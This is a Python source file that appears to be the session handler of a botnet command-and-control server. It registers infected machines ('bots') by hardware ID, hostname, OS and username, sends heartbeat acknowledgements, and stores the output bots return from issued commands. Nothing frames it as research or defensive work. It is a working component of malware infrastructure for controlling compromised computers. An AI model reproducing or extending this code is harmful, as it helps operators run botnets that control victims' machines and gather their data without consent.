import time
import uuid
import logging
from .registry import Registry, ClientConnection
from .storage import upsert_bot, save_response
from .protocol import read_packet, write_packet

logger = logging.getLogger(__name__)


async def handle_client_session(reader, writer, crypto, addr, registry: Registry):
    packet = await read_packet(reader, crypto)
    if packet.get("type") != "checkin":
        logger.warning(f"Expected checkin from {addr}, got {packet.get('type')}")
        return

    data = packet.get("data", {})
    hwid = data.get("hwid", "unknown")
    session_id = str(uuid.uuid4())

    conn = ClientConnection(hwid, addr, reader, writer, crypto)
    conn.session_id = session_id
    conn.info = data
    await registry.register(conn)
    await upsert_bot(data)

    logger.info(
        f"Bot registered: {data.get('hostname')} | {data.get('os')} | "
        f"{data.get('username')} | HWID={hwid[:16]}..."
    )

    ack = {
        "id": str(uuid.uuid4()),
        "seq": 0,
        "timestamp": int(time.time()),
        "type": "checkin_ack",
        "data": {"session_id": session_id, "heartbeat_interval": 30},
    }
    await write_packet(writer, crypto, ack)

    try:
        while True:
            packet = await read_packet(reader, crypto)
            ptype = packet.get("type", "")
            if ptype == "heartbeat":
                pass
            elif ptype == "response":
                resp_data = packet.get("data", {})
                cmd_id = resp_data.get("command_id", "")
                status = resp_data.get("status", "")
                output = resp_data.get("output", resp_data.get("data", ""))
                await save_response(packet["id"], cmd_id, status, str(output))
                logger.info(f"Response from {hwid[:16]}: [{status}] {str(output)[:200]}")
            elif ptype == "error":
                err = packet.get("data", {})
                logger.warning(f"Error from {hwid[:16]}: {err.get('message', '')}")
            else:
                logger.warning(f"Unknown packet type from {hwid[:16]}: {ptype}")
    except Exception as e:
        logger.info(f"Client {hwid[:16]} disconnected: {e}")
    finally:
        await registry.unregister(hwid)
